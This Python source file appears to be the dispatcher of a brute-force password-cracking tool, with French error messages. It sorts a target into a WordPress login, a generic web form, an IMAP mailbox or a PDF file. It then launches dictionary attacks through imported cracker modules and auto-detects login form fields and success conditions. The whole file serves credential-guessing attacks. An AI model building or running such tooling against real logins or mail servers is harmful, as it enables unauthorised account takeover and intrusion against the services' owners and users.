from web_attack import web_login_brute_force
from imap_cracker import imap_brute_force
from wordpress_cracker import wp_login_brute_force
from pdf_cracker import crack_pdf
from form_parser import auto_detect_form_fields_and_success

def analyze_target(target):
    if "wp-login" in target:
        return "wordpress"
    elif target.startswith("http"):
        return "web"
    elif target.endswith(".pdf"):
        return "pdf"
    elif "@" in target:
        return "imap"
    else:
        return "web"

def launch_attack(target_type, target, username, wordlist, mode, charset, min_len, max_len):
    if mode != "dictionary":
        raise NotImplementedError("Ce module ne supporte que le mode dictionnaire.")

    if target_type == "web":
        user_field, pass_field, action_url, method, success_check = auto_detect_form_fields_and_success(target)

        return web_login_brute_force(
            url=action_url,
            username=username,
            wordlist=wordlist,
            user_field=user_field,
            pass_field=pass_field,
            success_check=success_check
        )

    elif target_type == "wordpress":
        return wp_login_brute_force(target, username, wordlist)

    elif target_type == "imap":
        return imap_brute_force(server=target, username=username, wordlist=wordlist)

    elif target_type == "pdf":
        return crack_pdf(target, wordlist)

    else:
        raise ValueError("Type de cible non pris en charge.")
